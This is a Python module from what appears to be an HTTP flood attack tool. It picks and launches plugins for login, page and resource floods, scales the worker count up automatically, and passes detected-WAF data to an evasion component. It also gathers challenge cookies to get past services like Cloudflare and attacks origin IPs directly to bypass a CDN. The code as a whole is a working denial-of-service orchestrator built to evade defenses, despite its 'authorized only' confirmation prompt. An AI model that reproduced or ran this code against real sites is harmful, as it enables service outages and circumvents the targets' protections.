#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""VF_TESTER strategy — Strategy selection, plugin orchestration, and main run loop.

Split from VF_TESTER.py for Law 14 compliance (500-line limit).
This module contains the VFTesterStrategy mixin with strategy handling,
plugin selection/launching, dashboard loop, and the main run() lifecycle.
Core init/properties/lifecycle helpers are in vf_tester_core.py.
"""

from __future__ import annotations

import asyncio
import time
from typing import Any, Dict, List, Tuple
from urllib.parse import urlparse

import aiohttp

from logging_config import get_logger
logger = get_logger(__name__)

from vf_common import C

from plugin_system import AttackContext
from tester.vf_data import Stats
from tester.vf_plugin_orchestrator import ORIGIN_PLUGINS
from config.defaults import PLUGIN_CLEANUP_TIMEOUT, DEFAULT_KEEPALIVE_TIMEOUT, DEFAULT_DNS_CACHE_TTL
from utils.session_helpers import scanner_timeout
from engine.connection_pool import PoolLifecycleManager

# Import from vf_network — aiohttp guaranteed available (checked in vf_tester_core.py)
from vf_network import build_resilient_connector

# Phase 4: Observability imports (safe no-ops when disabled)
from observability.metrics import metrics as _metrics
from observability.metrics_ext import ext_metrics
from observability.tracing import async_span


# ═══════════════════════════════════════════════════════════════════════════════
# VFTesterStrategy — Strategy mixin for plugin orchestration and run loop
# ═══════════════════════════════════════════════════════════════════════════════

__all__ = ["VFTesterStrategy"]


class VFTesterStrategy:
    """Mixin providing strategy selection, plugin orchestration, and main run loop.

    This mixin is combined with VFTesterCore to form the complete VFTester class.
    Methods use self.xxx to access attributes defined in VFTesterCore.__init__().
    """

    # ─── Plugin Selection & Launching (delegated to PluginOrchestrator) ──

    def _select_plugins(self, vectors: List[str]) -> Dict[str, Dict[str, Any]]:
        """Select which plugins to activate based on attack vectors.
        Delegates to PluginOrchestrator.
        """
        return self._orchestrator.select_plugins(vectors, self.profile.origin_ips)

    def _compute_plugin_workers(self, plugin_name: str, total_max: int,
                                 origin_ips: List[str]) -> int:
        """Compute how many workers to assign to a plugin.
        Delegates to PluginOrchestrator.
        """
        return self._orchestrator.compute_plugin_workers(plugin_name, total_max, origin_ips)

    def _build_attack_context(self, plugin_name: str, session,
                               workers: int) -> AttackContext:
        """Build an AttackContext for a specific plugin.
        Delegates to PluginOrchestrator.
        """
        return self._orchestrator.build_attack_context(
            plugin_name, session, workers,
            url=self.url, site_root=self.site_root, domain=self.domain,
            stop_event=self._stop, stats_callback=self._record_hit,
            profile=self.profile, origin_ips=self.profile.origin_ips,
            page_targets=self.page_targets or [self.url],
            resource_targets=self.resource_targets or [f"{self.site_root}/favicon.ico"],
            verify_ssl=self._verify_ssl, ssl_ctx=self._ssl_ctx,
            evasion=self._evasion, base_headers_fn=self._base_headers,
            detected_waf=self.detected_waf,
            request_delay_ms=self.request_delay_ms,
            enable_cache_bust=self.enable_cache_bust,
            username_field=self.username_field,
            password_field=self.password_field,
            health_callback=lambda r: self.health_monitor.record(r),
        )

    async def _launch_plugins(self, selected_plugins: Dict[str, Dict[str, Any]],
                               session) -> int:
        """Launch all selected plugins with AttackContext.
        Delegates to PluginOrchestrator.
        """
        result = await self._orchestrator.launch_plugins(
            selected_plugins, session,
            url=self.url, site_root=self.site_root, domain=self.domain,
            stop_event=self._stop, stats_callback=self._record_hit,
            profile=self.profile, origin_ips=self.profile.origin_ips,
            page_targets=self.page_targets or [self.url],
            resource_targets=self.resource_targets or [f"{self.site_root}/favicon.ico"],
            verify_ssl=self._verify_ssl, ssl_ctx=self._ssl_ctx,
            evasion=self._evasion, base_headers_fn=self._base_headers,
            detected_waf=self.detected_waf,
            request_delay_ms=self.request_delay_ms,
            enable_cache_bust=self.enable_cache_bust,
            username_field=self.username_field,
            password_field=self.password_field,
            health_callback=lambda r: self.health_monitor.record(r),
            preflight_check_fn=self._preflight_check_origin_ips,
        )
        # BUG-013 fix: No need to sync convenience references —
        # properties now always delegate to the orchestrator.
        return result

    # ─── Strategy Selection (delegates UI to DashboardRenderer) ──────────

    def _handle_strategy_selection(self, strategy: str, vectors: List[str]) -> Tuple[str, List[str]]:
        """Handle strategy selection. Displays scan summary + strategies before attack starts.

        v22: Comprehensive RECONNAISSANCE SUMMARY box + compact strategy display.
        Delegates rendering to DashboardRenderer.
        """
        surgical_vectors = self.attack.get("surgical_vectors", [])
        all_vectors = self.attack.get("all_vectors", [])
        strategy_reason = self.attack.get("strategy_reason", "")
        surgical_analysis = self.attack.get("surgical_analysis", [])

        # Delegate UI rendering to dashboard
        self._dashboard.print_scan_summary(self.profile, self.attack,
                                            self.detected_waf, self.detected_cms)
        self._dashboard.print_strategy_box(strategy, vectors, strategy_reason, surgical_analysis)

        # Delegate user confirmation to dashboard
        if not self._dashboard.confirm_attack(self.domain, self._authorized_only, self._stop):
            return strategy, vectors

        return strategy, vectors

    # ─── Dashboard Loop ───────────────────────────────────────────────

    async def _run_dashboard_loop(self, strategy: str) -> None:
        """Run the main dashboard loop with auto-escalation via plugin scaling.

        Delegates scaling logic to AdaptiveScalingEngine.tick().
        Phase 4: Attack lifecycle tracked via Prometheus metrics.
        """
        self._scaling_engine.reset()

        # Phase 4: Track attack start
        ext_metrics.attack_lifecycle_total.labels(event="start").inc()

        try:
            async with async_span("storm_vx.attack.run", strategy=strategy, url=self.url):
                while not self._stop.is_set():
                    # Execute one scaling cycle
                    cmd = await self._scaling_engine.tick()
                    if cmd == 'q':
                        break

                    # v27: If all plugins are disabled/stopped
                    if not self._active_plugins and not self._scaling_engine.state.no_active_plugins_logged:
                        self._scaling_engine.state.no_active_plugins_logged = True
                        logger.warning(f"\n  [WARN] All plugins have been disabled/stopped.")
                        print(f"  {C.W}Continue waiting? [w]=wait for recovery  [q]=quit  [a]=abort attack{C.RS} ", end="", flush=True)
                        try:
                            loop = asyncio.get_running_loop()
                            action = await loop.run_in_executor(None, lambda: input().strip().lower())
                        except (EOFError, KeyboardInterrupt):
                            action = "q"
                        if action in ("q", "quit", "a", "abort"):
                            logger.warning(f"[STOP] Attack stopped by user.")
                            self._stop.set()
                            break

                    # Get health for dashboard display
                    health = self.health_monitor.health_score

                    # Print simple dashboard
                    try:
                        self._print_dashboard(self._total_workers, self.max_workers, strategy, health)
                    except (RuntimeError, OSError, ValueError, AttributeError) as e:
                        logger.debug(f"Dashboard render error (non-fatal): {e}")

                    # Snapshot
                    self._snap()

                    try:
                        await asyncio.sleep(1)
                    except asyncio.CancelledError:
                        break
        finally:
            # Phase 4: Track attack stop
            ext_metrics.attack_lifecycle_total.labels(event="stop").inc()


    def _scale_all_plugins(self, delta: int) -> int:
        """Scale ALL active plugins (including origin) by delta. Delegates to orchestrator."""
        return self._orchestrator.scale_all_plugins(delta)

    def _scale_plugins(self, delta: int) -> int:
        """Scale HTTP plugins by delta (for scaling UP). Delegates to orchestrator."""
        return self._orchestrator.scale_plugins(delta)

    def _print_dashboard(self, cur: int, max_w: int, strategy: str, health: float):
        """Print real-time dashboard. Delegates to DashboardRenderer."""
        self._dashboard.print_dashboard(cur, max_w, strategy, health)

    def _snap(self):
        self._snaps.append({
            "t": self.stats.duration, "total": self.stats.total,
            "ok": self.stats.ok, "fail": self.stats.fail,
            "rps": max(self.stats.rps_rolling, self.stats.requests_per_second), "workers": self.stats.users,
            "health": self.health_monitor.health_score,
        })

    # ─── Main Run ─────────────────────────────────────────────────────

    async def run(self):
        # BUG-FIX: Reset ALL state from previous runs.
        # Without this, calling run() again (e.g. user presses 'r' to repeat attack)
        # would fail because _stop event is still set, stale plugin tasks remain,
        # and _active_plugins/_disabled_plugins have dirty state from the previous run.
        self._stop = asyncio.Event()
        self._orchestrator.reset()
        # BUG-013 fix: No need to re-assign convenience references —
        # properties now always delegate to the orchestrator.
        self._scaling_engine.reset()
        self._session = None

        # Phase 1: Reset effectiveness tracker for new attack
        if self._effectiveness_tracker is not None:
            self._effectiveness_tracker.reset()

        # Phase 2: Reset smart timeout engine for new attack
        if self._smart_timeout is not None:
            self._smart_timeout.reset()

        self.stats = Stats()
        self.stats.t0 = time.monotonic()

        # Update dashboard's stats reference (new Stats object after reset)
        self._dashboard.stats = self.stats

        # Update scaling engine's references (new event + stats after reset)
        self._scaling_engine._stats = self.stats
        self._scaling_engine._stop = self._stop

        vectors = self.attack.get("attack_vectors", ["LOGIN_FLOOD", "PAGE_FLOOD", "RESOURCE_FLOOD"])
        strategy = self.attack.get("recommended_strategy", "GENERIC_FLOOD")
        pages = self.page_targets or [self.url]
        resources = self.resource_targets or [f"{self.site_root}/favicon.ico"]

        if not pages:
            pages = [self.url, f"{self.site_root}/"]

        actual_max = self.max_workers

        # Select plugins based on vectors
        selected_plugins = self._select_plugins(vectors)

        # Delegate banner + target info to dashboard
        self._dashboard.print_banner(
            url=self.url, strategy=strategy,
            detected_waf=self.detected_waf, detected_cms=self.detected_cms,
            is_aspnet=self.is_aspnet, is_wordpress=self.is_wordpress,
            origin_ips=self.profile.origin_ips,
            vectors=vectors, actual_max=actual_max,
            initial_workers=self.initial_workers, step=self.step,
            page_count=len(pages), resource_count=len(resources),
            registry_names=self._registry.names,
            registry_errors=self._registry.errors,
            selected_plugins=selected_plugins,
        )

        # Strategy selection (delegates UI to dashboard)
        strategy, vectors = self._handle_strategy_selection(strategy, vectors)

        # v27: If user declined the attack, exit early
        if self._stop.is_set():
            return

        # Delegate countdown to dashboard
        await self._dashboard.print_countdown()
        self._dashboard.print_attack_started()

        await self.keyboard.start()

        # Connection pool setup
        # BUG-FIX v35: Connection pool must scale with max_workers, not be
        # capped at a fixed strategy limit. Old code used:
        #   conn_limit = min(actual_max, STRATEGY_CONCURRENCY_LIMITS[strategy])
        # which capped connections at 300 for STANDARD strategy. When workers
        # exceeded 300, requests queued inside aiohttp's connector, and the
        # ClientTimeout(total=10) timer ticked while waiting for a connection.
        # This caused cascading timeouts → scaling engine shrinks → pool frees
        # → requests succeed → workers grow → cycle repeats.
        # Now the pool scales with max_workers so there's always a connection
        # available for each active worker.
        conn_limit = actual_max

        # W2.7: build_resilient_connector now delegates to create_connector()
        connector = build_resilient_connector(
            max_connections=conn_limit,
            per_host_limit=0,  # Single target, no per-host limit needed
            keepalive_timeout=DEFAULT_KEEPALIVE_TIMEOUT,
            dns_cache_ttl=DEFAULT_DNS_CACHE_TTL,
            pool_stats=self._pool_stats,  # P2: pass pool stats
        )

        timeout = scanner_timeout()

        # v24: Create a cookie jar that persists across requests
        cookie_jar = aiohttp.CookieJar(unsafe=True)

        # BUG-22 FIX: Extract trace_config from connector for pool_stats monitoring
        _trace_configs = []
        if hasattr(connector, '_vf_trace_config'):
            _trace_configs = [connector._vf_trace_config]

        async with aiohttp.ClientSession(connector=connector, timeout=timeout,
                                         cookie_jar=cookie_jar,
                                         trace_configs=_trace_configs) as session:
            if self.is_aspnet:
                await self._refresh_viewstate(session)

            # v24: Session warmup — visit target to establish cookies
            # Many WAFs (Cloudflare, ArvanCloud) set challenge cookies on first visit
            # Without these cookies, subsequent requests get blocked immediately
            await self._session_warmup(session)

            # v24: Pass WAF info to evasion manager
            if hasattr(self._evasion, 'set_waf'):
                self._evasion.set_waf(self.detected_waf or "")

            # Launch all plugins
            # BUG-013 fix: _total_workers is now a property that delegates
            # to the orchestrator, so the setter automatically syncs both.
            self._total_workers = await self._launch_plugins(selected_plugins, session)

            # v26 P2: Store session for auto-recovery plugin re-launching
            self._session = session

            # Phase 1: Start connection pool lifecycle manager
            self._pool_lifecycle = PoolLifecycleManager(session.connector)
            self._pool_cleanup_task = asyncio.create_task(
                self._pool_lifecycle.run_cleanup_loop(),
                name="pool-lifecycle-cleanup"
            )

            # Print origin attack details if applicable
            # BUG-21 FIX: Use self.profile.origin_ips instead of bare 'origin_ips'
            # (origin_ips is a local var in __init__, not accessible in run())
            _origin_ips = self.profile.origin_ips
            if _origin_ips:
                target_is_https = urlparse(self.url).scheme == 'https'
                atk_port = 443 if target_is_https else 80
                logger.info(f"\n  [ORIGIN-ATTACK] CDN bypass via {len(_origin_ips)} origin IPs")
                for pname, plugin in self._active_plugins.items():
                    if pname in ORIGIN_PLUGINS:
                        wc = plugin.worker_count
                        logger.info(f"[→] {pname}: {wc} workers")
                logger.info(f"[+] HTTP workers: {self._total_workers - sum(p.worker_count for n, p in self._active_plugins.items() if n in ORIGIN_PLUGINS)}")

            if self._active_plugins:
                logger.info(f"[*] {len(self._active_plugins)} plugins launched\n")

            # Dashboard loop
            await self._run_dashboard_loop(strategy)

            # Cleanup
            try:
                await self.keyboard.stop()
            except (OSError, IOError):
                pass

            self._stop.set()

            # Phase 1: Stop connection pool lifecycle manager
            if hasattr(self, '_pool_lifecycle') and self._pool_lifecycle:
                self._pool_lifecycle.stop()
            if hasattr(self, '_pool_cleanup_task') and self._pool_cleanup_task:
                self._pool_cleanup_task.cancel()

            # Stop all plugins via orchestrator
            self._orchestrator.stop_all()

            # Cancel plugin tasks and wait with timeout
            if self._orchestrator.plugin_tasks:
                for t in self._orchestrator.plugin_tasks:
                    if not t.done():
                        t.cancel()
                try:
                    await asyncio.wait_for(
                        asyncio.gather(*self._orchestrator.plugin_tasks, return_exceptions=True),
                        timeout=PLUGIN_CLEANUP_TIMEOUT  # W2.4
                    )
                except asyncio.TimeoutError:
                    logger.debug("Plugin tasks did not finish within timeout")
                except (asyncio.CancelledError, RuntimeError):
                    pass

        # ── v21: Hacker Final Report (delegated to DashboardRenderer) ──
        # v26 P2: Clear dangling session reference
        self._session = None

        self._dashboard.print_final_report(self.stats, self._orchestrator.active_plugins)
